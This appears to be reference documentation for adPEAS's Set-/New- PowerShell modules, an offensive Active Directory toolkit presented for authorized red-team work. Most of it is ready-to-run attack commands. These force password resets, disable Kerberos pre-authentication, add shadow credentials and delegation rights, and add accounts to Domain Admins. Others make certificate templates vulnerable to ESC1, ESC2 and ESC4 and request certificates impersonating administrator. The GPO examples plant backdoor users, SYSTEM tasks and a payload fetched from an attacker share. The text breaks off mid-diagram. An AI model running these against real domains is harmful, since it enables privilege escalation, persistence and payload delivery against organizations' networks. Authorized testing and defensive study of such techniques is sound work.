# Set- & New-Module Reference (Active Directory Modification Functions)


---

> ## ⚠️ IMPORTANT LEGAL DISCLAIMER ⚠️
>
> **USE THESE MODULES AT YOUR OWN RISK!**
> 
> These modules are EXPERIMENTAL and should be used with caution!
> 
> Unauthorized use of these functions is **ILLEGAL** and may violate:
> - Computer Fraud and Abuse Act (CFAA)
> - Computer Misuse Act (UK)
> - StGB §202a-c, §303a-b (Germany)
> - Similar laws in your jurisdiction
>
> **You MUST have:**
> - Written authorization from the system owner
> - A valid penetration testing contract
> - Explicit scope definition including AD modifications
>
> **These functions are intended for:**
> - Authorized penetration testing
> - Red team engagements
> - Security research in lab environments
> - Authorized security assessments
>
> **The authors accept NO LIABILITY for misuse of these tools.**

---

> ## 🧪 EXPERIMENTAL STATUS
>
> The `Set-*` and `New-*` functions in adPEAS are under active development.
> While they have been tested in lab environments, they may:
>
> - Contain bugs that cause unexpected behavior
> - Produce unintended side effects in certain AD configurations
> - Not handle all edge cases or error conditions gracefully
> - Change in behavior between versions
>
> **Best Practices:**
> - Always test in a lab environment first
> - Have a rollback plan before making changes
> - Document all modifications for cleanup
> - Use `-PassThru` to verify operations completed as expected
> - Start with non-critical targets during initial testing

---

## Overview

The Set- and New- Modules provide Active Directory modification capabilities for authorized penetration testing and red team operations. They allow manipulation of:

- **User accounts** (Set-DomainUser)
- **Computer accounts** (Set-DomainComputer)
- **Groups** (Set-DomainGroup)
- **Certificate Templates** (Set-CertificateTemplate)
- **Certificate Requests** (Request-ADCSCertificate)
- **Group Policy Objects** (Set-DomainGPO)
- **Generic AD Objects** (Set-DomainObject)

---

## Set-DomainUser

Modifies user objects in Active Directory for privilege escalation and persistence.

### Available Operations

| Operation | Parameter | Description | Attack Technique |
|-----------|-----------|-------------|------------------|
| **Password Reset** | `-NewPassword` | Force-reset user password | Credential theft |
| **Password Change** | `-NewPassword -OldPassword` | Change password (requires old) | Legitimate change |
| **Set Owner** | `-Owner` | Take ownership of user object | ACL abuse |
| **Grant Rights** | `-GrantRights -Principal` | Add ACL permissions | Persistence |
| **Add RBCD** | `-AddRBCD` | Configure Resource-Based Constrained Delegation | Delegation abuse |
| **Clear RBCD** | `-ClearRBCD` | Remove RBCD configuration | Cleanup |
| **Add Shadow Credential** | `-AddShadowCredential` | Add msDS-KeyCredentialLink for PKINIT | Shadow Credentials |
| **Clear Shadow Credentials** | `-ClearShadowCredentials` | Remove Shadow Credentials | Cleanup |
| **Set SPN** | `-SetSPN` | Add Service Principal Name | Targeted Kerberoasting |
| **Clear SPN** | `-ClearSPN` | Remove SPN | Cleanup |
| **DontReqPreauth** | `-DontReqPreauth` | Set DONT_REQ_PREAUTH flag (UAC 0x400000) | ASREPRoasting |
| **Clear DontReqPreauth** | `-ClearDontReqPreauth` | Remove DONT_REQ_PREAUTH flag | Cleanup |
| **Enable Account** | `-Enable` | Enable disabled account | Persistence |
| **Disable Account** | `-Disable` | Disable account | Denial of Service |
| **Unlock Account** | `-Unlock` | Unlock locked account | Access recovery |
| **Password Not Required** | `-PasswordNotRequired` | Set PASSWD_NOTREQD flag (UAC 0x0020) | Account weakening |
| **Clear Password Not Required** | `-ClearPasswordNotRequired` | Remove PASSWD_NOTREQD flag | Cleanup |
| **Password Can't Change** | `-PasswordCantChange` | Set PASSWD_CANT_CHANGE flag (UAC 0x0040) | Persistence |
| **Clear Password Can't Change** | `-ClearPasswordCantChange` | Remove PASSWD_CANT_CHANGE flag | Cleanup |
| **Reversible Encryption** | `-ReversibleEncryption` | Set ENCRYPTED_TEXT_PWD_ALLOWED flag (UAC 0x0080) | Credential theft |
| **Clear Reversible Encryption** | `-ClearReversibleEncryption` | Remove ENCRYPTED_TEXT_PWD_ALLOWED flag | Cleanup |
| **Password Never Expires** | `-PasswordNeverExpires` | Set DONT_EXPIRE_PASSWORD flag (UAC 0x10000) | Persistence |
| **Clear Password Never Expires** | `-ClearPasswordNeverExpires` | Remove DONT_EXPIRE_PASSWORD flag | Cleanup |
| **Smartcard Required** | `-SmartcardRequired` | Set SMARTCARD_REQUIRED flag (UAC 0x40000) | Account lockout |
| **Clear Smartcard Required** | `-ClearSmartcardRequired` | Remove SMARTCARD_REQUIRED flag | Cleanup |
| **Not Delegated** | `-NotDelegated` | Set NOT_DELEGATED flag (UAC 0x100000) | Defensive / Cleanup |
| **Clear Not Delegated** | `-ClearNotDelegated` | Remove NOT_DELEGATED flag | Cleanup |
| **Password Expired** | `-PasswordExpired` | Force password change at next logon (UAC 0x800000) | Account disruption |
| **Clear Password Expired** | `-ClearPasswordExpired` | Remove PASSWORD_EXPIRED flag | Cleanup |

### Syntax

```powershell
Set-DomainUser
    -Identity <String>
    [-NewPassword <String>]
    [-OldPassword <String>]
    [-Owner <String>]
    [-GrantRights <String>] [-Principal <String>]
    [-AddRBCD <String>]
    [-ClearRBCD] [-Principal <String>] [-Force]
    [-AddShadowCredential] [-DeviceID <String>]
    [-ClearShadowCredentials] [-DeviceID <String>] [-Force]
    [-SetSPN <String>]
    [-ClearSPN <String>] [-Force]
    [-DontReqPreauth] [-ClearDontReqPreauth]
    [-Enable]
    [-Disable]
    [-Unlock]
    [-PasswordNotRequired] [-ClearPasswordNotRequired]
    [-PasswordCantChange] [-ClearPasswordCantChange]
    [-ReversibleEncryption] [-ClearReversibleEncryption]
    [-PasswordNeverExpires] [-ClearPasswordNeverExpires]
    [-SmartcardRequired] [-ClearSmartcardRequired]
    [-NotDelegated] [-ClearNotDelegated]
    [-PasswordExpired] [-ClearPasswordExpired]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Examples

```powershell
# Targeted Kerberoasting: Add SPN to user
Set-DomainUser -Identity "serviceaccount" -SetSPN "HTTP/fakeservice.contoso.com"
# User is now Kerberoastable!

# ASREPRoasting: Disable pre-authentication
Set-DomainUser -Identity "targetuser" -DontReqPreauth
# User's hash can now be retrieved without authentication!

# Shadow Credentials: Add PKINIT certificate
Set-DomainUser -Identity "targetuser" -AddShadowCredential
# Returns PFX certificate for authentication!

# RBCD: Configure delegation
Set-DomainUser -Identity "targetuser" -AddRBCD "YOURCOMPUTER$"
# YOURCOMPUTER$ can now impersonate users TO targetuser!

# Force password reset (requires ResetPassword rights)
Set-DomainUser -Identity "targetuser" -NewPassword "NewP@ssw0rd!"

# Enable disabled account
Set-DomainUser -Identity "disableduser" -Enable

# Cleanup: Remove SPN
Set-DomainUser -Identity "serviceaccount" -ClearSPN "HTTP/fakeservice.contoso.com"

# Cleanup: Re-enable pre-authentication
Set-DomainUser -Identity "targetuser" -ClearDontReqPreauth

# UAC Flag Manipulation: Allow empty password
Set-DomainUser -Identity "targetuser" -PasswordNotRequired

# UAC Flag Manipulation: Password never expires (persistence)
Set-DomainUser -Identity "backdooruser" -PasswordNeverExpires

# UAC Flag Manipulation: Enable reversible encryption (credential theft)
Set-DomainUser -Identity "targetuser" -ReversibleEncryption

# UAC Flag Manipulation: Mark account as sensitive (defensive)
Set-DomainUser -Identity "adminuser" -NotDelegated

# Cleanup: Remove UAC flags
Set-DomainUser -Identity "targetuser" -ClearPasswordNotRequired
Set-DomainUser -Identity "backdooruser" -ClearPasswordNeverExpires
Set-DomainUser -Identity "targetuser" -ClearReversibleEncryption
Set-DomainUser -Identity "adminuser" -ClearNotDelegated
```

---

## Set-DomainComputer

Modifies computer objects in Active Directory for delegation attacks and persistence.

### Available Operations

| Operation | Parameter | Description | Attack Technique |
|-----------|-----------|-------------|------------------|
| **Add RBCD** | `-AddRBCD` | Configure Resource-Based Constrained Delegation | RBCD attack |
| **Clear RBCD** | `-ClearRBCD` | Remove RBCD configuration | Cleanup |
| **Set Owner** | `-Owner` | Take ownership of computer object | ACL abuse |
| **Grant Rights** | `-GrantRights -Principal` | Add ACL permissions | Persistence |
| **Add Shadow Credential** | `-AddShadowCredential` | Add msDS-KeyCredentialLink | Shadow Credentials |
| **Clear Shadow Credentials** | `-ClearShadowCredentials` | Remove Shadow Credentials | Cleanup |
| **Enable Account** | `-Enable` | Enable disabled computer | Persistence |
| **Disable Account** | `-Disable` | Disable computer account | Denial of Service |
| **Set Unconstrained Delegation** | `-SetTrustedForDelegation` | Enable Unconstrained Delegation | Delegation abuse |
| **Clear Unconstrained Delegation** | `-ClearTrustedForDelegation` | Disable Unconstrained Delegation | Cleanup |
| **Set Constrained Delegation** | `-SetConstrainedDelegation` | Configure Constrained Delegation SPNs | Delegation abuse |
| **Clear Constrained Delegation** | `-ClearConstrainedDelegation` | Remove Constrained Delegation | Cleanup |
| **Set Protocol Transition** | `-SetTrustedToAuthForDelegation` | Enable S4U2Self | Delegation abuse |
| **Clear Protocol Transition** | `-ClearTrustedToAuthForDelegation` | Disable S4U2Self | Cleanup |
| **Password Not Required** | `-PasswordNotRequired` | Set PASSWD_NOTREQD flag (UAC 0x0020) | Account weakening |
| **Password Never Expires** | `-PasswordNeverExpires` | Set DONT_EXPIRE_PASSWORD flag (UAC 0x10000) | Persistence |
| **Not Delegated** | `-NotDelegated` | Set NOT_DELEGATED flag (UAC 0x100000) | Defensive / Cleanup |
| **Clear Not Delegated** | `-ClearNotDelegated` | Remove NOT_DELEGATED flag (UAC 0x100000) | Re-enable delegation |
| **Disable Pre-Authentication** | `-DontReqPreauth` | Set DONT_REQ_PREAUTH flag (UAC 0x400000) | AS-REP Roasting |
| **Enable Pre-Authentication** | `-ClearDontReqPreauth` | Remove DONT_REQ_PREAUTH flag (UAC 0x400000) | Cleanup |

### Syntax

```powershell
Set-DomainComputer
    -Identity <String>
    [-AddRBCD <String>]
    [-ClearRBCD] [-Principal <String>] [-Force]
    [-Owner <String>]
    [-GrantRights <String>] [-Principal <String>]
    [-AddShadowCredential] [-DeviceID <String>]
    [-ClearShadowCredentials] [-DeviceID <String>] [-Force]
    [-Enable]
    [-Disable]
    [-SetTrustedForDelegation]
    [-ClearTrustedForDelegation]
    [-SetConstrainedDelegation <String[]>]
    [-ClearConstrainedDelegation] [-Principal <String>] [-Force]
    [-SetTrustedToAuthForDelegation]
    [-ClearTrustedToAuthForDelegation]
    [-PasswordNotRequired]
    [-PasswordNeverExpires]
    [-NotDelegated]
    [-ClearNotDelegated]
    [-DontReqPreauth]
    [-ClearDontReqPreauth]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Examples

```powershell
# RBCD Attack: Configure delegation to DC
Set-DomainComputer -Identity "DC01" -AddRBCD "YOURCOMPUTER$"
# YOURCOMPUTER$ can now impersonate users TO DC01!

# Shadow Credentials on computer
Set-DomainComputer -Identity "FILESERVER01" -AddShadowCredential
# Returns PFX certificate for computer authentication!

# Unconstrained Delegation (HIGH IMPACT!)
Set-DomainComputer -Identity "YOURCOMPUTER$" -SetTrustedForDelegation
# Computer can now impersonate ANY user to ANY service!

# Constrained Delegation to specific SPNs
Set-DomainComputer -Identity "YOURCOMPUTER$" -SetConstrainedDelegation @("cifs/dc01.contoso.com", "ldap/dc01.contoso.com")
# Computer can delegate to these specific services

# Protocol Transition (S4U2Self)
Set-DomainComputer -Identity "YOURCOMPUTER$" -SetTrustedToAuthForDelegation
# Computer can obtain service tickets without user credentials!

# Enable disabled computer
Set-DomainComputer -Identity "DISABLEDPC" -Enable

# Cleanup: Remove RBCD
Set-DomainComputer -Identity "DC01" -ClearRBCD -Force

# Cleanup: Disable Unconstrained Delegation
Set-DomainComputer -Identity "YOURCOMPUTER$" -ClearTrustedForDelegation

# UAC: Allow empty password on computer account
Set-DomainComputer -Identity "YOURCOMPUTER$" -PasswordNotRequired

# UAC: Password never expires (persistence)
Set-DomainComputer -Identity "YOURCOMPUTER$" -PasswordNeverExpires

# UAC: Disable pre-authentication (AS-REP Roasting on computer)
Set-DomainComputer -Identity "YOURCOMPUTER$" -DontReqPreauth

# UAC: Mark as sensitive / prevent delegation (defensive)
Set-DomainComputer -Identity "DC01" -NotDelegated

# Cleanup: Re-enable pre-authentication
Set-DomainComputer -Identity "YOURCOMPUTER$" -ClearDontReqPreauth

# Cleanup: Remove NOT_DELEGATED protection
Set-DomainComputer -Identity "DC01" -ClearNotDelegated
```

### Delegation Attack Chain

```
1. Create computer account (New-DomainComputer)
        ↓
2. Configure RBCD on target (Set-DomainComputer -AddRBCD)
        ↓
3. Request TGT for created computer (Invoke-KerberosAuth)
        ↓
4. S4U2Self: Get service ticket as any user
        ↓
5. S4U2Proxy: Delegate to target service
        ↓
6. Impersonate Domain Admin to target!
```

---

## Set-DomainGroup

Modifies group objects in Active Directory for privilege escalation.

### Available Operations

| Operation | Parameter | Description | Attack Technique |
|-----------|-----------|-------------|------------------|
| **Add Member** | `-AddMember` | Add user/computer to group | Privilege escalation |
| **Remove Member** | `-RemoveMember` | Remove member from group | Cleanup |
| **Clear Members** | `-ClearMembers -Force` | Remove ALL members | Denial of Service |
| **Set Description** | `-SetDescription` | Set group description | Camouflage |
| **Clear Description** | `-ClearDescription` | Remove description | Cleanup |
| **Convert to Security** | `-ConvertToSecurity` | Distribution → Security group | Enable ACL usage |
| **Convert to Distribution** | `-ConvertToDistribution` | Security → Distribution group | Disarm group |
| **Set Owner** | `-Owner` | Take ownership of group | ACL abuse |
| **Grant Rights** | `-GrantRights -Principal` | Add ACL permissions | Persistence |

### Syntax

```powershell
Set-DomainGroup
    -Identity <String>
    [-AddMember <String[]>]
    [-RemoveMember <String[]>]
    [-ClearMembers] [-Force]
    [-SetDescription <String>]
    [-ClearDescription]
    [-ConvertToSecurity]
    [-ConvertToDistribution]
    [-Owner <String>]
    [-GrantRights <String>] [-Principal <String>]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Examples

```powershell
# Add user to Domain Admins (requires WriteMembers permission)
Set-DomainGroup -Identity "Domain Admins" -AddMember "eviluser"
# User is now Domain Admin!

# Add multiple members
Set-DomainGroup -Identity "Backup Operators" -AddMember @("user1", "user2", "computer1$")

# Remove member from group
Set-DomainGroup -Identity "Domain Admins" -RemoveMember "eviluser"

# Clear ALL members (destructive!)
Set-DomainGroup -Identity "IT-Support" -ClearMembers -Force
# Group is now empty!

# Set description for camouflage
Set-DomainGroup -Identity "Backdoor-Group" -SetDescription "Legitimate IT Support Group"

# Convert Distribution to Security group (enable ACL usage)
Set-DomainGroup -Identity "MailGroup" -ConvertToSecurity
# Group can now be used for permissions!

# "Disarm" Security group (convert to Distribution)
Set-DomainGroup -Identity "Domain Admins" -ConvertToDistribution
# Group can no longer be used for permissions!
# WARNING: This is highly destructive!

# Take ownership of group
Set-DomainGroup -Identity "Domain Admins" -Owner "CONTOSO\attacker"

# Grant WriteMembers rights
Set-DomainGroup -Identity "Domain Admins" -GrantRights WriteMembers -Principal "CONTOSO\attacker"
```

### Group Type Values

| Type | groupType Value | Description |
|------|-----------------|-------------|
| Global Security | -2147483646 (0x80000002) | Default security group |
| DomainLocal Security | -2147483644 (0x80000004) | Local to domain |
| Universal Security | -2147483640 (0x80000008) | Forest-wide |
| Global Distribution | 2 (0x2) | Email only, no ACL |
| DomainLocal Distribution | 4 (0x4) | Email only, local |
| Universal Distribution | 8 (0x8) | Email only, forest |

---

## Set-CertificateTemplate

Modifies AD CS certificate templates for ESC attacks.

### Available Operations

| Operation | Parameter | Description | Attack Technique |
|-----------|-----------|-------------|------------------|
| **Allow Enrollee Supplies Subject** | `-AllowEnrolleeSuppliesSubject` | Enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT | ESC1 |
| **Add Client Authentication** | `-AddClientAuthentication` | Add Client Auth EKU | ESC1/ESC2 |
| **Allow Exportable Key** | `-AllowExportableKey` | Enable key export | Key theft |
| **Remove Manager Approval** | `-RemoveManagerApproval` | Disable approval requirement | ESC1 |
| **Grant Enrollment** | `-GrantEnrollment` | Grant enrollment permission | ESC4 |
| **Grant Full Control** | `-GrantFullControl` | Grant GenericAll | ESC4 |
| **Grant Write** | `-GrantWrite` | Grant WriteProperty | ESC4 |
| **Revoke Enrollment** | `-RevokeEnrollment` | Remove enrollment permission | Cleanup |
| **Disable Enrollee Supplies Subject** | `-DisableEnrolleeSuppliesSubject` | Restore CA-supplied subject | Cleanup |
| **Add Manager Approval** | `-AddManagerApproval` | Require approval | Cleanup |
| **Remove EKU** | `-RemoveEKU` | Remove specific EKU | Cleanup |
| **Add Any Purpose EKU** | `-AddAnyPurposeEKU` | Add Any Purpose (2.5.29.37.0) | ESC2 |
| **Clear EKUs** | `-ClearEKUs` | Remove all EKUs | ESC2 |
| **Add Smartcard Logon** | `-AddSmartcardLogon` | Add Smartcard Logon EKU | PKINIT |
| **Set Owner** | `-SetOwner` | Take ownership | ESC4 |
| **Grant AutoEnroll** | `-GrantAutoEnroll` | Grant auto-enrollment | Persistence |
| **Export** | `-Export` | Backup template to JSON | Backup |
| **Import** | `-Import` | Restore template from JSON backup | Restore |

### Syntax

```powershell
Set-CertificateTemplate
    -Identity <String>
    [-AllowEnrolleeSuppliesSubject]
    [-AddClientAuthentication]
    [-AllowExportableKey]
    [-RemoveManagerApproval]
    [-GrantEnrollment <String>]
    [-GrantFullControl <String>]
    [-GrantWrite <String>]
    [-RevokeEnrollment <String>]
    [-DisableEnrolleeSuppliesSubject]
    [-AddManagerApproval]
    [-RemoveEKU <String>]
    [-AddAnyPurposeEKU]
    [-ClearEKUs]
    [-AddSmartcardLogon]
    [-SetOwner <String>]
    [-GrantAutoEnroll <String>]
    [-Export <String>]
    [-Import <String>]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Examples

```powershell
# ESC1: Make template vulnerable
Set-CertificateTemplate -Identity "WebServer" -AllowEnrolleeSuppliesSubject -AddClientAuthentication -RemoveManagerApproval
# Template is now vulnerable to ESC1!

# ESC2: Add Any Purpose EKU
Set-CertificateTemplate -Identity "User" -AddAnyPurposeEKU
# Certificate can be used for any purpose!

# ESC4: Grant enrollment to low-priv user
Set-CertificateTemplate -Identity "DomainController" -GrantEnrollment "CONTOSO\LowPrivUser"
# User can now enroll in DC template!

# Add Smartcard Logon for PKINIT
Set-CertificateTemplate -Identity "SmartcardUser" -AddSmartcardLogon

# Backup template before modification
Set-CertificateTemplate -Identity "WebServer" -Export "C:\Backup\WebServer.json"

# Restore template from backup
Set-CertificateTemplate -Import "C:\Backup\WebServer.json"

# Cleanup: Revert ESC1 changes
Set-CertificateTemplate -Identity "WebServer" -DisableEnrolleeSuppliesSubject -AddManagerApproval

# Cleanup: Revoke enrollment
Set-CertificateTemplate -Identity "WebServer" -RevokeEnrollment "CONTOSO\TestUser"
```

### ESC Attack Matrix

| ESC | Vulnerability | Parameter |
|-----|---------------|-----------|
| ESC1 | Enrollee supplies subject + Client Auth | `-AllowEnrolleeSuppliesSubject -AddClientAuthentication` |
| ESC2 | Any Purpose EKU | `-AddAnyPurposeEKU` |
| ESC2 | No EKUs | `-ClearEKUs` |
| ESC4 | Vulnerable ACL | `-GrantEnrollment`, `-GrantFullControl` |

---

## Request-ADCSCertificate

Requests a certificate from an ADCS Certificate Authority via the `/certsrv/` Web Enrollment endpoint. Generates a PKCS#10 CSR, submits it, retrieves the issued certificate, and saves it as a PFX file. Supports ESC1 and ESC4 exploitation.

### Available Operations

| Operation                | Parameter                           | Description                                   | Attack Technique       |
| ------------------------ | ----------------------------------- | --------------------------------------------- | ---------------------- |
| **Basic Request**        | `-TemplateName`                     | Request certificate from a template           | Certificate enrollment |
| **Impersonate User**     | `-Impersonate "admin@contoso.com"`  | Request certificate as another user (UPN SAN) | ESC1                   |
| **Impersonate Computer** | `-Impersonate "srv-dc.contoso.com"` | Request certificate with DNS SAN              | ESC1                   |
| **Custom Subject/SAN**   | `-Subject -UPN -DNS`                | Manual subject and SAN control                | ESC1                   |
| **Modify Template**      | `-ModifyTemplate`                   | Temporarily modify template for exploitation  | ESC4                   |
| **No Password**          | `-NoPassword`                       | Export PFX without password protection        | Convenience            |

### Syntax

```powershell
Request-ADCSCertificate
    -TemplateName <String>
    [-CAServer <String>]
    [-Impersonate <String>]
    [-Subject <String>]
    [-UPN <String>]
    [-DNS <String[]>]
    [-AlternativeNames <String[]>]
    [-KeyLength <Int> {1024|2048|4096}]
    [-OutputPath <String>]
    [-Credential <PSCredential>]
    [-ModifyTemplate]
    [-UseHTTP]
    [-NoPassword]
    [-PassThru]
    [-Force]
    [-Domain <String>]
    [-Server <String>]
```

### Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `-TemplateName` | String | Certificate template name (e.g., "User", "WebServer") |
| `-CAServer` | String | FQDN of the CA server. If not specified, auto-discovers from AD. |
| `-Impersonate` | String | Username, UPN, or FQDN to impersonate. Auto-resolves Subject and SAN. |
| `-Subject` | String | Certificate subject name. "CN=" prefix added automatically if omitted. |
| `-UPN` | String | User Principal Name for SAN (e.g., "admin@contoso.com") |
| `-DNS` | String[] | DNS hostnames for SAN (e.g., "dc01.contoso.com") |
| `-KeyLength` | Int | RSA key length in bits. Default: 2048. |
| `-OutputPath` | String | Path for PFX file. Default: auto-generated from subject. |
| `-Credential` | PSCredential | Credentials for HTTP authentication against certsrv. |
| `-ModifyTemplate` | Switch | ESC4: Temporarily modify template, request cert, then restore. |
| `-UseHTTP` | Switch | Use HTTP instead of HTTPS for certsrv requests. |
| `-NoPassword` | Switch | Export PFX without password protection. |
| `-PassThru` | Switch | Return result object instead of console output. |
| `-Force` | Switch | Overwrite existing PFX file without prompting. |

### CA Auto-Discovery

When `-CAServer` is not specified, `Request-ADCSCertificate` automatically:

1. Discovers all CAs from Active Directory
2. Filters CAs that publish the requested template
3. Tests reachability (HTTPS first, HTTP fallback)
4. Falls back to the next CA if the first is unreachable

### -Impersonate Convenience Parameter

The `-Impersonate` parameter accepts three formats and automatically derives Subject and SAN:

| Input | Detected As | Subject | SAN |
|-------|-------------|---------|-----|
| `"administrator"` | Username | CN=administrator | UPN:administrator@contoso.com |
| `"admin@contoso.com"` | UPN | CN=admin | UPN:admin@contoso.com |
| `"srv-dc.contoso.com"` | FQDN | CN=srv-dc | DNS:srv-dc.contoso.com |

### Examples

```powershell
# Basic enrollment with auto-discovered CA
Request-ADCSCertificate -TemplateName "User"

# ESC1: Request certificate as Administrator
Request-ADCSCertificate -TemplateName "VulnTemplate" -Impersonate "administrator"

# ESC1: With explicit subject and UPN SAN
Request-ADCSCertificate -TemplateName "VulnTemplate" -Subject "Administrator" -UPN "administrator@contoso.com"

# ESC1: Computer certificate with DNS SAN
Request-ADCSCertificate -TemplateName "Machine" -Impersonate "dc01.contoso.com"

# ESC4: Temporarily modify template, request cert, then restore
Request-ADCSCertificate -TemplateName "WebServer" -ModifyTemplate -Impersonate "administrator"

# With explicit CA server and credentials
Request-ADCSCertificate -CAServer "ca01.contoso.com" -TemplateName "User" -Credential (Get-Credential)

# PFX without password (convenient for follow-up commands)
Request-ADCSCertificate -TemplateName "User" -NoPassword

# Scripting with -PassThru
$result = Request-ADCSCertificate -TemplateName "VulnTemplate" -Impersonate "admin" -PassThru
Connect-adPEAS -Domain "contoso.com" -Certificate $result.PFXPath -CertificatePassword $result.PFXPassword
```

### ESC4 Workflow (-ModifyTemplate)

The `-ModifyTemplate` parameter automates the full ESC4 attack chain:

```
1. Backup template to JSON file
        ↓
2. Modify template:
   - AllowEnrolleeSuppliesSubject (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
   - AddClientAuthentication EKU
   - AllowExportableKey
   - RemoveManagerApproval
        ↓
3. Request certificate with specified Subject/SAN
        ↓
4. Restore original template from backup (always, even on error)
```

Requires WriteDACL, WriteProperty, or GenericAll on the template object. The backup file is kept after restore for audit purposes.

### Output (Console)

```
[*] Found 2 Certificate Authority(ies) in Active Directory
[*] Auto-discovered CA: Contoso-CA (ca01.contoso.com)
[*] Requesting certificate from CA 'ca01.contoso.com' using template 'VulnTemplate'
[*] Generated 2048-bit RSA key pair and PKCS#10 CSR
[+] Certificate issued (Request ID: 42)
[+] Certificate saved as PFX:
    PFX Path:                                    administrator_20260219_120000.pfx
    PFX Password:                                K8#mP2@xL9!nQ4$wR7
    Thumbprint:                                  3F2B1C...
    Subject:                                     CN=administrator
    Issuer:                                      CN=Contoso-CA
    Valid Until:                                 2027-02-19
    Template:                                    VulnTemplate
    SAN:                                         Other Name:Principal Name=administrator@contoso.com

[*] Usage with Connect-adPEAS:
    Connect-adPEAS -Domain contoso.com -Certificate 'administrator_20260219_120000.pfx' -CertificatePassword 'K8#mP2@xL9!nQ4$wR7'
```

### Output (-PassThru)

```powershell
[PSCustomObject]@{
    Success     = $true
    Status      = 'Issued'
    RequestID   = 42
    PFXPath     = "administrator_20260219_120000.pfx"
    PFXPassword = "K8#mP2@xL9!nQ4$wR7"
    Thumbprint  = "3F2B1C..."
    Subject     = "CN=administrator"
    Issuer      = "CN=Contoso-CA"
    Template    = "VulnTemplate"
    CAServer    = "ca01.contoso.com"
}
```

---

## Set-DomainGPO

Modifies Group Policy Objects for persistence and privilege escalation.

### Available Operations

| Operation | Parameter | Description | Attack Technique |
|-----------|-----------|-------------|------------------|
| **Link GPO** | `-LinkTo` | Link GPO to OU/Domain | Apply policy |
| **Unlink GPO** | `-UnlinkFrom` | Remove GPO link | Cleanup |
| **Set Owner** | `-Owner` | Take ownership | ACL abuse |
| **Grant Rights** | `-GrantRights -Principal` | Add ACL permissions | Persistence |
| **Add Scheduled Task** | `-AddScheduledTask` | Create immediate scheduled task via GPO | Code execution |
| **Add Local Group Member** | `-AddLocalGroupMember` | Add user to local group via GPO | Local admin |
| **Add Startup Script** | `-AddStartupScript` | Deploy machine startup script | Persistence |
| **Add Logon Script** | `-AddLogonScript` | Deploy user logon script | Persistence |
| **Add Service** | `-AddService` | Install Windows service via GPO | Persistence |
| **Deploy File** | `-DeployFile` | Copy file via GPO | Payload delivery |
| **Add Firewall Rule** | `-AddFirewallRule` | Create firewall rule via GPO | Network access |
| **Sync SYSVOL** | `-SyncSYSVOL` | Sync AD permissions to SYSVOL | Fix permissions |

### Syntax

```powershell
Set-DomainGPO
    -Identity <String>
    [-LinkTo <String>] [-LinkEnabled] [-LinkEnforced]
    [-UnlinkFrom <String>]
    [-Owner <String>]
    [-GrantRights <String>] [-Principal <String>]
    [-AddScheduledTask] [-TaskName <String>] [-TaskCommand <String>] [-TaskArguments <String>] [-TaskRunAs <String>]
    [-AddLocalGroupMember] [-LocalGroup <String>] [-MemberToAdd <String>]
    [-AddStartupScript] [-AddLogonScript] [-ScriptPath <String>] [-ScriptContent <String>] [-ScriptName <String>] [-ScriptParameters <String>]
    [-AddService] [-ServiceName <String>] [-BinaryPath <String>] [-ServiceDisplayName <String>] [-StartType <String>] [-ServiceAccount <String>]
    [-DeployFile] [-SourceFile <String>] [-DestinationPath <String>] [-FileAction <String>]
    [-AddFirewallRule] [-RuleName <String>] [-RuleDirection <String>] [-RuleAction <String>] [-RuleProtocol <String>] [-RuleLocalPort <String>] [-RuleRemotePort <String>] [-RuleRemoteAddress <String>] [-RuleProgram <String>]
    [-SyncSYSVOL]
    [-NoSYSVOL]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Examples

```powershell
# Link GPO to OU
Set-DomainGPO -Identity "Malicious Policy" -LinkTo "OU=Servers,DC=contoso,DC=com"

# Link with enforcement
Set-DomainGPO -Identity "Malicious Policy" -LinkTo "OU=Servers,DC=contoso,DC=com" -LinkEnforced

# Unlink GPO
Set-DomainGPO -Identity "Malicious Policy" -UnlinkFrom "OU=Servers,DC=contoso,DC=com"

# Take ownership
Set-DomainGPO -Identity "Default Domain Policy" -Owner "CONTOSO\attacker"

# Grant edit permissions
Set-DomainGPO -Identity "Default Domain Policy" -GrantRights GenericAll -Principal "CONTOSO\attacker"

# Add immediate scheduled task (runs as SYSTEM)
Set-DomainGPO -Identity "Backdoor Policy" -AddScheduledTask -TaskName "Update" -TaskCommand "cmd.exe" -TaskArguments "/c whoami > C:\temp\test.txt"

# Add user to local Administrators via GPO
Set-DomainGPO -Identity "Admin Policy" -AddLocalGroupMember -LocalGroup "Administrators" -MemberToAdd "CONTOSO\attacker"

# Deploy startup script
Set-DomainGPO -Identity "Script Policy" -AddStartupScript -ScriptContent "net user backdoor P@ss /add" -ScriptName "update.bat"

# Install a Windows service via GPO
Set-DomainGPO -Identity "Service Policy" -AddService -ServiceName "UpdateSvc" -BinaryPath "C:\Windows\Temp\svc.exe" -StartType Automatic

# Deploy a file via GPO
Set-DomainGPO -Identity "Deploy Policy" -DeployFile -SourceFile "\\attacker\share\payload.exe" -DestinationPath "C:\Windows\Temp\update.exe" -FileAction Create

# Add firewall rule allowing C2 traffic
Set-DomainGPO -Identity "FW Policy" -AddFirewallRule -RuleName "Allow Updates" -RuleDirection Outbound -RuleAction Allow -RuleProtocol TCP -RuleRemotePort 443
```

---

## Set-DomainObject

Low-level function for modifying any AD object. Used internally by other Set-* functions.

### Syntax

```powershell
Set-DomainObject
    [-Identity <String>]
    [-SearchBase <String>]
    [-Set <Hashtable>]
    [-Append <Hashtable>]
    [-Remove <Hashtable>]
    [-Clear <String[]>]
    [-Principal <String>]
    [-Rights <String>]
    [-ExtendedRight <String>]
    [-GrantACE]
    [-RevokeACE]
    [-DenyACE]
    [-ClearACE]
    [-SetOwner]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Architecture

Set-DomainObject uses the unified `LdapConnection` architecture with `ModifyRequest`:

```
Set-DomainObject
    |
    +-> Invoke-LDAPSearch (find object)
    |       |
    |       +-> $Script:LdapConnection
    |
    +-> ModifyRequest (attribute changes)
    |       |
    |       +-> DirectoryAttributeModification (Add/Replace/Delete)
    |       |
    |       +-> $Script:LdapConnection.SendRequest()
    |
    +-> ACL Modifications
            |
